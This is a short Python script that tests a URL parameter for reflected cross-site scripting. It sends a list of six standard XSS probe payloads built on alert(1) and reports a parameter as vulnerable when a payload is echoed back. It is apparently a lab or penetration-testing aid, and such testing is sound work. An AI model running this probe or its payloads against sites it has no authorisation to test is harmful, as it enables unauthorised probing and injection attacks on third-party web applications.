#!/usr/bin/env python3
"""XSS Payload Tester - Tests URL parameters with XSS payloads. LAB USE ONLY."""

import requests
import urllib.parse

PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
]

def test_url(url, param):
    for payload in PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, timeout=5)
            if payload in r.text or 'alert(1)' in r.text:
                print(f"[VULN] Param {param}: {payload[:50]}...")
        except Exception as e:
            print(f"Error: {e}")

def main():
    import sys
    if len(sys.argv) < 3:
        print("Usage: python tester.py <url> <param_name>")
        return
    url, param = sys.argv[1], sys.argv[2]
    print(f"[*] Testing {url} param={param}")
    test_url(url, param)

if __name__ == '__main__':
    main()
